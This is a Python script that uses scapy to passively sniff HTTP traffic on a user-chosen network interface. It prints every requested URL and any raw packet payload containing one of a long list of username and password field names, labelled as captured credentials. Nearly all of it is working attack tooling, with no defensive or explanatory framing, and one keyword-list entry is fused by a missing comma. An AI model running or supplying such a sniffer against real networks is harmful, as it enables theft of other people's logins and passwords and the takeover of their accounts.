import scapy.all as scapy
from scapy.layers import http
from termcolor import colored

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=filtered_sniffed_pkt)

def filter_url(pkt):
    return pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path

def filter_creds(pkt):
    if pkt.haslayer(scapy.Raw):
            load = pkt[scapy.Raw].load
            field_list = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario', 'ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']
            for keyword in field_list:
                if keyword.encode() in load:
                    return load

def filtered_sniffed_pkt(pkt):
    if pkt.haslayer(http.HTTPRequest):
        url = filter_url(pkt)
        print(colored("<-!-> URL ----> " + url.decode(), 'yellow'))
        creds = filter_creds(pkt)
        if creds:
            print(colored("\n<-!-> Credentials ----> " + creds.decode() + "\n",'green'))
                    

interface = input(colored("</> Enter your network Preference: ", 'blue'))
sniff(interface)